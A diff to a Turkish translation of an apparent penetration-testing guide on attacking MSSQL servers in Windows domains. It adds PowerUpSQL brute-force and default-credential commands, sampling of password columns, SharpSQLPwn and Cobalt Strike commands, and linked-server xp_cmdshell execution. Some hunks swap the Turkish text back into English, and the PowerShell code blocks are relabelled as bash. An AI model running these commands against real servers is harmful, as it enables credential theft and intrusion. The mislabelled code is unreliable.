@@ -91,11 +91,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ###  Powershell
 
 Bu durumda powershell modülü [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) çok faydalıdır.
-```powershell
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
 ### Alan oturumu olmadan ağdan numaralandırma
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -109,7 +109,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### Alan içinden numaralandırma
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -127,14 +133,26 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Temel İstismar
+## MSSQL Temel Suistimal
 
 ### Erişim Veritabanı
-```powershell
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -144,13 +162,13 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ### MSSQL RCE
 
 MSSQL sunucusu içinde **komutlar çalıştırmak** da mümkün olabilir.
-```powershell
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
 **Aşağıdaki bölümde bunu manuel olarak nasıl yapacağınızı kontrol edin.**
 
-### MSSQL Temel Hacking İpuçları
+### MSSQL Temel Hacking Hileleri
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
@@ -158,12 +176,12 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL Güvenilir Bağlantılar
 
-Eğer bir MSSQL örneği başka bir MSSQL örneği tarafından güvenilir (veritabanı bağlantısı) olarak kabul ediliyorsa. Eğer kullanıcının güvenilir veritabanı üzerinde yetkileri varsa, **güven ilişkisini kullanarak diğer örnekte de sorgular çalıştırabilecektir**. Bu güven ilişkileri zincirlenebilir ve bir noktada kullanıcı, komut çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.
+Eğer bir MSSQL örneği, farklı bir MSSQL örneği tarafından güvenilir (veritabanı bağlantısı) olarak kabul ediliyorsa. Kullanıcının güvenilir veritabanı üzerinde yetkileri varsa, **güven ilişkisini kullanarak diğer örnekte de sorgular çalıştırabilecektir**. Bu güven ilişkileri zincirlenebilir ve bir noktada kullanıcı, komutları çalıştırabileceği yanlış yapılandırılmış bir veritabanı bulabilir.
 
 **Veritabanları arasındaki bağlantılar, orman güvenleri arasında bile çalışır.**
 
 ### Powershell Suistimali
-```powershell
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,6 +212,12 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+Başka benzer bir araç olarak [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn) kullanılabilir:
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
 Metasploit kullanarak güvenilir bağlantıları kolayca kontrol edebilirsiniz.
@@ -202,15 +226,15 @@ Metasploit kullanarak güvenilir bağlantıları kolayca kontrol edebilirsiniz.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Metasploit'in yalnızca MSSQL'deki `openquery()` fonksiyonunu kötüye kullanmaya çalışacağını unutmayın (yani, `openquery()` ile komut çalıştıramıyorsanız, komutları çalıştırmak için `EXECUTE` yöntemini **manuel** olarak denemeniz gerekecek, daha fazla bilgi aşağıda.)
+Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)
 
-### Manuel - Openquery()
+### Manual - Openquery()
 
-**Linux**'tan **sqsh** ve **mssqlclient.py** ile bir MSSQL konsol kabuğu elde edebilirsiniz.
+From **Linux** you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py.**
 
-**Windows**'tan da bağlantıları bulabilir ve komutları manuel olarak bir **MSSQL istemcisi gibi** [**HeidiSQL**](https://www.heidisql.com) kullanarak çalıştırabilirsiniz.
+From **Windows** you could also find the links and execute commands manually using a **MSSQL client like** [**HeidiSQL**](https://www.heidisql.com)
 
-_Windows kimlik doğrulaması ile giriş yapın:_
+_Login using Windows authentication:_
 
 ![](<../../images/image (808).png>)
 
@@ -228,7 +252,7 @@ Bağlantı üzerinden sorguları çalıştırın (örnek: yeni erişilebilir ör
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Çift ve tek tırnakların nerede kullanıldığını kontrol edin, bu şekilde kullanmak önemlidir.
+> İki ve tek tırnakların nerede kullanıldığını kontrol edin, bu şekilde kullanmak önemlidir.
 
 ![](<../../images/image (643).png>)
 
@@ -254,8 +278,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL yerel kullanıcısı** genellikle **`SeImpersonatePrivilege`** adı verilen özel bir yetkiye sahiptir. Bu, hesabın "kimlik doğrulamasından sonra bir istemciyi taklit etmesine" olanak tanır.
 
-Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya ortadaki adam hizmetine kimlik doğrulaması yapmaya zorlamaktır. Bu sahte hizmet, kimlik doğrulaması yapmaya çalışırken SİSTEM hizmetini taklit edebilir.
+Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya ortadaki hizmete kimlik doğrulaması yapmaya zorlamaktır. Bu sahte hizmet, kimlik doğrulaması yapmaya çalışırken SİSTEM hizmetini taklit edebilir.
 
 [SweetPotato](https://github.com/CCob/SweetPotato), Beacon'ın `execute-assembly` komutu aracılığıyla yürütülebilen bu çeşitli tekniklerin bir derlemesini sunmaktadır.
+
 
 {{#include ../../banners/hacktricks-training.md}}
